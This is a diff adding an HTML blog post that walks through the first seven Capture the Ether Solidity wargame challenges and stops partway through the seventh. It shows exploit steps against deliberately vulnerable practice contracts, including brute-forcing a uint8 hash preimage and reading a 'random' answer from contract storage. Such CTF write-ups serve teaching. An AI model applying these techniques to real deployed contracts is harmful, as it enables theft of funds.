@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Demystifying Solidity Wargames: Smarx&#39;s capture the ether ::
+        AHZ
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="CHALLENGES ONGOING#WARMUP CHALLENGES#CHALLENGE 1: DEPLOY A CONTRACT#Objective:#Deploy the challenge contract. Demystifying Contract:#The contract is constructed based on a method that returns true when it&amp;rsquo;s called:
+function isComplete() public pure returns (bool) { return true; } Demystifying Solution:#Simply, Deploy the contract.
+CHALLENGE 2: CALL ME#Objective:#Call the function named callme. Demystifying Contract:#The contract is constructed based on a method, The first line is defining a variable:"
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/post/demystifying-solidity-wargames-smarxs-capture-the-ether/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Demystifying Solidity Wargames: Smarx&#39;s capture the ether"/>
+<meta name="twitter:description" content="In this write-up, I will demystify how to conquer the Smarx&#39;s capture the ether wargame."/>
+
+
+
+<meta property="og:title" content="Demystifying Solidity Wargames: Smarx&#39;s capture the ether" />
+<meta property="og:description" content="In this write-up, I will demystify how to conquer the Smarx&#39;s capture the ether wargame." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/post/demystifying-solidity-wargames-smarxs-capture-the-ether/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-06-30T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-06-30T00:00:00+00:00" /><meta property="og:site_name" content="AHZ" />
+
+
+
+
+
+
+  </head>
+  <body class="light-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+
+    <span class="logo__text"
+      >AHZ</span
+    >
+
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/files/cv.pdf">About</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/files/cv.pdf">About</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">Demystifying Solidity Wargames: Smarx&rsquo;s capture the ether</h1>
+    <div class="post-meta">
+      
+        <time class="post-date">
+          2021-06-30
+        </time>
+
+        
+          
+        
+      
+
+      
+
+      
+        
+          <span class="post-read-time"
+            >— 10 min read</span
+          >
+        
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="/tags/smarx/">#Smarx</a>&nbsp;
+        
+          <a href="/tags/solidity/">#Solidity</a>&nbsp;
+        
+          <a href="/tags/wargame/">#Wargame</a>&nbsp;
+        
+      </span>
+    
+
+    
+      <figure class="post-cover">
+  
+    <img src="/img/Demystifying-solidity-wargames-smarx-capture-the-ether/cover.png" alt="Demystifying Solidity Wargames: Smarx&#39;s capture the ether"/>
+  
+
+  
+</figure>
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="challenges-ongoing">
+  CHALLENGES ONGOING
+  <a href="#challenges-ongoing" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<h2 id="warmup-challenges">
+  WARMUP CHALLENGES
+  <a href="#warmup-challenges" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="challenge-1-deploy-a-contract">
+  CHALLENGE 1: DEPLOY A CONTRACT
+  <a href="#challenge-1-deploy-a-contract" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="objective">
+  Objective:
+  <a href="#objective" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<ul>
+<li>Deploy the challenge contract.</li>
+</ul>
+<h4 id="demystifying-contract">
+  Demystifying Contract:
+  <a href="#demystifying-contract" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The contract is constructed based on a method that returns true when it&rsquo;s called:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isComplete</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">pure</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="demystifying-solution">
+  Demystifying Solution:
+  <a href="#demystifying-solution" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>Simply, Deploy the contract.</p>
+<h3 id="challenge-2-call-me">
+  CHALLENGE 2: CALL ME
+  <a href="#challenge-2-call-me" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="objective-1">
+  Objective:
+  <a href="#objective-1" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<ul>
+<li>Call the function named <code>callme</code>.</li>
+</ul>
+<h4 id="demystifying-contract-1">
+  Demystifying Contract:
+  <a href="#demystifying-contract-1" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The contract is constructed based on a method, The first line is defining a variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">bool</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">isComplete</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span></code></pre></div><p>The first line is the isComplete variable initiated as false.</p>
+<p>The callme() method sets the isComplete variable to true.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">callme</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">isComplete</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="demystifying-solution-1">
+  Demystifying Solution:
+  <a href="#demystifying-solution-1" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>Simply, Call the callme() function.</p>
+<h3 id="challenge-3-choose-a-nickname">
+  CHALLENGE 3: CHOOSE A NICKNAME
+  <a href="#challenge-3-choose-a-nickname" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="objective-2">
+  Objective:
+  <a href="#objective-2" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<ul>
+<li>Set your nickname to a non-empty string.</li>
+</ul>
+<h4 id="demystifying-contracts">
+  Demystifying Contracts:
+  <a href="#demystifying-contracts" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<h4 id="capturetheether-contract">
+  CaptureTheEther Contract:
+  <a href="#capturetheether-contract" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The contract is constructed based on a function, The first line defines a map:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">mapping</span> (<span style="color:#a6e22e">address</span> =&gt; <span style="color:#a6e22e">bytes32</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">nicknameOf</span>;
+</span></span></code></pre></div><p>The map is defined as &ldquo;nicknameOf&rdquo; that assigns every address to it&rsquo;s nickname.</p>
+<p>The setNickname() method sets the nickname to the nickname parameter for the caller address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setNickname</span>(<span style="color:#a6e22e">bytes32</span> <span style="color:#a6e22e">nickname</span>) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nicknameOf</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">nickname</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="nicknamechallenge-contract">
+  NicknameChallenge Contract:
+  <a href="#nicknamechallenge-contract" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The first line initialize the instance for the CaptureTheEther contract interface, The second line is the player address variable.</p>
+<p>The NicknameChallenge() method sets the player address variable to the _player address parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">NicknameChallenge</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_player</span>) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">player</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_player</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The isComplete() method validates the player nickname is not equal to 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isComplete</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">cte</span>.<span style="color:#a6e22e">nicknameOf</span>(<span style="color:#a6e22e">player</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="demystifying-solution-2">
+  Demystifying Solution:
+  <a href="#demystifying-solution-2" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>Call the the setNickname() method with the address chosen nickname, The nickname parameter is expected to be <code>bytes32</code>.</p>
+<h2 id="lotteries-challenges">
+  LOTTERIES CHALLENGES
+  <a href="#lotteries-challenges" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="challenge-4-guess-the-number">
+  CHALLENGE 4: GUESS THE NUMBER
+  <a href="#challenge-4-guess-the-number" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="objective-3">
+  Objective:
+  <a href="#objective-3" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<ul>
+<li>Guess the number.</li>
+</ul>
+<h4 id="demystifying-contract-2">
+  Demystifying Contract:
+  <a href="#demystifying-contract-2" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The contract is constructed based on different functions, The first line is initiating the answer variable to 42:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">uint8</span> <span style="color:#a6e22e">answer</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>;
+</span></span></code></pre></div><p>The GuessTheNumberChallenge() method requires the transfered value equal to 1 ether to initiate the challange:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">GuessTheNumberChallenge</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The isComplete() method returns true if the address balance is 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isComplete</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The guess() method requires the transfered value equal to 1 ether and it transfer the balance back if the n parameter is equal to the answer variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">guess</span>(<span style="color:#a6e22e">uint8</span> <span style="color:#a6e22e">n</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">n</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">answer</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#ae81ff">2</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="demystifying-solution-3">
+  Demystifying Solution:
+  <a href="#demystifying-solution-3" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The answer is hardcoded in the contract, Simply call the guess() method with 42.</p>
+<h3 id="challenge-5-guess-the-number">
+  CHALLENGE 5: GUESS THE NUMBER
+  <a href="#challenge-5-guess-the-number" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="objective-4">
+  Objective:
+  <a href="#objective-4" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<ul>
+<li>Guess the number by reversing the cryptographic hash.</li>
+</ul>
+<h4 id="demystifying-contract-3">
+  Demystifying Contract:
+  <a href="#demystifying-contract-3" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The contract is constructed based on different functions, The first line is initiating the answerHash variable to a hexadecimal hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">bytes32</span> <span style="color:#a6e22e">answerHash</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;
+</span></span></code></pre></div><p>The GuessTheNumberChallenge() method requires the transfered value equal to 1 ether to initiate the challange:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">GuessTheSecretNumberChallenge</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The isComplete() method returns true if the address balance is 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isComplete</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The guess() method requires the transfered value equal to 1 ether and it transfer the balance back if the n parameter hexadecimal hash is equal to the answerHash variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">guess</span>(<span style="color:#a6e22e">uint8</span> <span style="color:#a6e22e">n</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">n</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">answerHash</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#ae81ff">2</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="demystifying-solution-4">
+  Demystifying Solution:
+  <a href="#demystifying-solution-4" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>Due to the n parameter of the type <code>uint8</code>, We can simply brute-force the 255 possibilities:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">255</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">answerHash</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">answerHash</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">keccak256</span>([<span style="color:#a6e22e">i</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">n</span><span style="color:#f92672">=</span><span style="color:#e6db74">`i`</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><h3 id="challenge-6-guess-the-random-number">
+  CHALLENGE 6: GUESS THE RANDOM NUMBER
+  <a href="#challenge-6-guess-the-random-number" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="objective-5">
+  Objective:
+  <a href="#objective-5" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<ul>
+<li>Guess the number.</li>
+</ul>
+<h4 id="demystifying-contract-4">
+  Demystifying Contract:
+  <a href="#demystifying-contract-4" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The contract is constructed based on different functions, The first line is the answer variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">uint8</span> <span style="color:#a6e22e">answer</span>;
+</span></span></code></pre></div><p>The GuessTheNumberChallenge() method requires the transfered value equal to 1 ether to initiate the challange and sets the answer variable to the hash of the block numder:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">GuessTheRandomNumberChallenge</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">answer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint8</span>(<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">blockhash</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>), <span style="color:#a6e22e">now</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The isComplete() method returns true if the address balance is 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isComplete</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The guess() method requires the transfered value equal to 1 ether and it transfer the balance back if the n parameter is equal to the answer variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">guess</span>(<span style="color:#a6e22e">uint8</span> <span style="color:#a6e22e">n</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">n</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">answer</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#ae81ff">2</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="demystifying-solution-5">
+  Demystifying Solution:
+  <a href="#demystifying-solution-5" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The answer is publicly availabe in the blockchain as the contract slot.</p>
+<p>We can read the answer by reading it&rsquo;s slot which is slot 1:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">getStorageAt</span>(<span style="color:#a6e22e">instance</span>, <span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><h3 id="challenge-7-guess-the-new-number">
+  CHALLENGE 7: GUESS THE NEW NUMBER
+  <a href="#challenge-7-guess-the-new-number" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="objective-6">
+  Objective:
+  <a href="#objective-6" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<ul>
+<li>Guess the number while it&rsquo;s generated on-demand when a guess is made.</li>
+</ul>
+<h4 id="demystifying-contract-5">
+  Demystifying Contract:
+  <a href="#demystifying-contract-5" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The contract is constructed based on different functions.</p>
+<p>The GuessTheNumberChallenge() method requires the transfered value equal to 1 ether to initiate the challange:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">GuessTheNewNumberChallenge</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The isComplete() method returns true if the address balance is 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isComplete</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The guess() method requires the transfered value equal to 1 ether and it transfer the balance back if the n parameter is equal to the answer variable:</p>
